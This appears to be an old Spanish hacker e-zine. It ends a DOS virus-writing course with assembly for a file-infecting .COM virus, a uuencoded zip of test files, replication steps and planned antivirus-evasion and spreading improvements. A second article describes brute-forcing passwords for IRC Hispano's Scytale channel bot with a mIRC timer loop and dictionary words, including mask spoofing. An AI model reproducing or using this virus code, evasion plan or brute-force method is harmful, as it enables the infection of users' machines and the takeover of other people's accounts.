        mov     cx,VirLENGTH
        lea     dx,VirBEGIN
        int     21h

 Ahora movemos el puntero de nuevo al comienzo del virus y escribimos el
salto. Para ello hemos preparado ya una copia exacta del salto en las
variables de final del c¢digo v¡rico:

salto   db      0e9h    opcode de salto near (no relativo)
long    dw      ?

 Una vez que hemos copiado el salto (siguiendo id‚ntico procedimiento al
usado para a¤adir al final el virus) ponemos la fecha que estaba antes
usando un servicio del DOS y tomando los datos del DTA.

 Cerramos el archivo y reponemos los registros DS y ES. Esto no ser¡a
necesario dado que este virus no cambia en ning£n momento esos datos,
pero es muy probable que si modific is el virus incluy is servicios del
DOS que s¡ los modifiquen (por ejemplo instalar un gestor de la int 24h
para que el virus no de error al intentar escribir en un disco protegido
contra escritura), y para que no se os olvide lo he puesto. Finalmente
restauramos el DTA antiguo (no hemos guardado su direcci¢n anterior,
pero sabemos que por defecto est  situado en 80h):

        mov     ah,1ah
        mov     dx,80h
        int     21h

y finalizamos con el ret (queda 100h en la pila) ;)

 Bueno, pues eso es todo lo que hace el virus. Como podr‚is comprobar se
reproduce correctamente y los archivos infectados siguen ejecut ndose
perfectamente. Para que pod is practicar os adjunto un host de prueba y
un programilla para ver los cambios que el virus hace en dicho archivo.

=== UUENCODE begin 'utils.zip' ===
begin 644 utils.zip
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
M!0``"``````````!`"``````````0T%:02Y#3TU02P$"%``4``(`"`#``5<>
M!2_T-"(@``")(0``"0```````````"````!0````1DE,14,N0T]-4$L%!@``
2```"``(`;0```)D@````````
`
end
=== UUENCODE end 'utils.zip' ===

 Hacer lo siguiente. Copi is el archivo 'caza.com' a 'caza2.com' de modo
que teng is dos copias id‚nticas. A continuaci¢n ejecut is el virus en
ese mismo directorio UNA SOLA VEZ (que si no infectar  ambas copias). Y
luego ejecut is 'filec caza.com caza2.com' y podr‚is ver c¢mo ha
cambiado el host. Si acontinuac¢n ejecut is 'caza.com' y volv‚is a
comparar ambas copias ver‚is que ahora son id‚nticas, el virus se ha
reproducido y las copias tambi‚n se reproducen.

 Cosas que quedan por hacer con este virus:

 i) Tal y como est  ser  muy dif¡cil de mejorar, dado que los saltos
condicionales que usa est n al l¡mite de su distancia }:)))), as¡ que el
que quiera seguir trabajando con ‚l tendra que meter toda la infecci¢n
en un procedimiento y dejar el cuerpo del virus aparte.

 ii) El virus no infecta archivos protegidos contra escritura. Deber¡a
cambiarse los atributos del archivo a infectar y restaurarlos despu‚s.

 iii) El virus es demasiado evidente. Salvo el SCAN (X"DDDDDDDDD) todos
los antivirus que he probado lo detectan. El TBAV salta unos pocos
flags, aunque son todos muy f ciles de evitar. Adem s falta un adecuado
tratamiento de la int 24h, para evitar problemas con discos protegidos.

 iv) El virus no saltar  nunca de directorio, a menos que se meta en un
directorio del PATH, pudiendo entonces extenderse por todo el HD.

 v) Cualquier antivirus residente lo parar .

 Todas estas cosas las iremos evitando conforme mejoremos el virus. All¡
donde consigamos ir un paso por delante de los antivirus mejoraremos los
antivirus existentes, ya que es ese el motivo del curso actual. De
momento podemos tirar el SCAN a la basura y confiar en los dem s para
controlar este virus.

 Bueno pues por hoy ya es bastante... creo que no he metido la pata en
nada de lo aqu¡ expuesto pero si alguno ve fallos que por favor los
comente (la verdad es que es f cil que haya metido la gamba en algo :??)

 Dudas todas las que quer is como ya os dije este es un paso importante
en el curso y el esqueleto aqu¡ expuesto lo usaremos de ahora en
adelante para a¤adirle muchas mejoras ;)

 Patuel.
[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
			%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
			%%$$$$$$$$$$$$$$$$$$$$$$$$$$%%
			%%    Hacking a Scytale     %%
			%%$$$$$$$$$$$$$$$$$$$$$$$$$$%%
			%%	  by []KHAN[]       %%
			%%$$$$$$$$$$$$$$$$$$$$$$$$$$%%
			%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

	Lo primero de todo una corta introduccion, Scytale es el bot que 
"controla" el IRC Hispano, y como no, el cabron que se guarda en una base de 
datos todas las contraseñas para tener OP en el canal que quieras. Si no 
sabeis lo que OP o alguna de estas cosas, yo no lo voy a explicar aqui, para
esto partimos de que teneis unos conocimientos medios de IRC, si no, mirad
primero la RareGaZz 9 (GuyBrush), la 11 (lobo) o la 13 (CyberDan) donde se
explica basicamente lo que es el IRC...

	La forma de hackear al scytale es sencilla pero lenta, que yo sepa
no hay manear de bajar la base de datos del bot, solo un ataque bruto, aunque
como todo, seguro que se puede, si entras como root por telnet y sabes que 
ficherito es, pues lo bajas, pero aun no se como se llama :( asi que explicare como hacer un ataque de fuerza bruta, se trata de hacer un programa en cualquier lenguaje de programacion (en el mIRC es muy facil) que pruebe contraseñas de un diccionario dando nombre de canal y nombre de usuario, pero CUIDADO! ahora controlan tambien que mascara tienes, es decir, hay varias mascaras: No pasa nada con ninguno menos con *!*@*.server.ext entonces nosotros tendremos que tener su mismo server, si no, no podremos, con los otros tipos de mascara es facil, te pones su nick, su host... :).... Estoy haciendo un addon para mIRC que va a hacer justamente eso, si eres creativo y te gusta la "programacion" podrias intentar hacer el tuyo propio, no es mas que un programa que lea de un diccionario una clave, y luego la guarde en una variable (ej. %pass), en otra variable el canal (%canal) y en otra el nick del lamer (%nick) y no tienes mas que hacer que un: " /timer1 0 3 /msg scytale auth %canal %nick %pass " y a cada intento que lea una clave nueva, tambien quedaria guapo que controle cuando scytale te da OP en el canal %canal y entonces mostrar por pantalla la clave correcta y un /timer1 off para que no siga intentandolo... TEN CUIDADO, EN EL IRC HISPANO COMO EN CASI
TODOS HAY FLOOD, YA SABES, MAS DE X LINEAS EN X SEGUNDOS Y TE VAS A LA CALLE

 ()------------()  /\/\/\/\/\/\/\/\/\/\/\/\
<--> []KHAN[] <--> | khan@cyberaragon.com |
 ()------------()  \/\/\/\/\/\/\/\/\/\/\/\/

[[[[[[[[[[[[[[[[[ZeD-wOrLd-EzInE numero 4]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]

-----------------------------------------------------------------------------
_/_/_/_/_/ _/_/_/_/_/ _/_/_/_/_/ _/      _/ _/       _/ _/_/_/_/_/ _/_/_/_/_/
    _/     _/      _/ _/      _/  _/    _/  _/_/     _/ _/      _/ _/
    _/     _/      _/ _/      _/   _/  _/   _/ _/    _/ _/      _/ _/
    _/     _/_/_/_/_/ _/      _/    _/_/    _/  _/   _/ _/      _/ _/_/_/_/_/
    _/     _/_/       _/      _/     _/     _/   _/  _/ _/      _/         _/
    _/     _/  _/     _/      _/    _/      _/    _/ _/ _/      _/         _/
    _/     _/    _/   _/      _/   _/       _/     _/_/ _/      _/         _/
    _/     _/      _/ _/_/_/_/_/  _/        _/       _/ _/_/_/_/_/ _/_/_/_/_/
-----------------------------------------------------------------------------
